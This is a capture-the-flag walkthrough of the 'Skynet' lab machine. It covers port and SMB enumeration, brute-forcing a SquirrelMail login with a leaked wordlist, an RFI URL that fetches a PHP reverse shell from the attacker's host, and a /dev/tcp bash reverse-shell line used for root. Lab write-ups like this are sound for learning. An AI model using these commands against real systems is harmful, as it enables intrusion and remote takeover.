# Skynet
#### Silver Garc√≠a
----

IP: 10.10.61.158

## NMAP
```
Host is up (0.17s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL AUTH-RESP-CODE UIDL RESP-CODES TOP CAPA PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS LITERAL+ LOGINDISABLEDA0001 more have post-login capabilities listed Pre-login ID IDLE OK SASL-IR IMAP4rev1 ENABLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
| smb2-time: 
|   date: 2023-07-12T21:58:04
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-07-12T16:58:04-05:00
```

## Samba anonymous share
### SMBMap
```
smbmap -H 10.10.61.158
```
```
[+] Guest session       IP: 10.10.61.158:445    Name: 10.10.61.158                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
```

command: smbclient //10.10.61.158/anonymous
Files:
- attention.txt
```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

```
- log1.txt
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
- log2.txt
- log3.txt

## SquirrelMail
**Login page:** /squirrelmail/src/login.php

Found squirrelmail password using Burp Suite Intruder with log1.txt file
username: milesdyson
password: cyborg007haloterminator

emial found:
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

## Samba mylesdyson share
important.txt file found on notes folder:
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

## Gobuster on hidden directory
gobuster dir --url http://10.10.61.158/45kra24zxs28v3yd/ --wordlist=/usr/share/wordlists/dirb/common.txt 

url: http://10.10.61.158/45kra24zxs28v3yd/administrator/

## Remote file inclusion
1. Open python server hosting php-reverse-shell file:
2. Set listener
3. Visit next URL to get reverse shell:
```
http://10.10.61.158/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.145.104:8000/php-reverse-shell.php
```

## Privilege escalation
File to get reverse root shell
```
'#!/bin/bash\nbash -i >& /dev/tcp/10.10.44.131/6666 0>&1' > /var/www/html/shell
```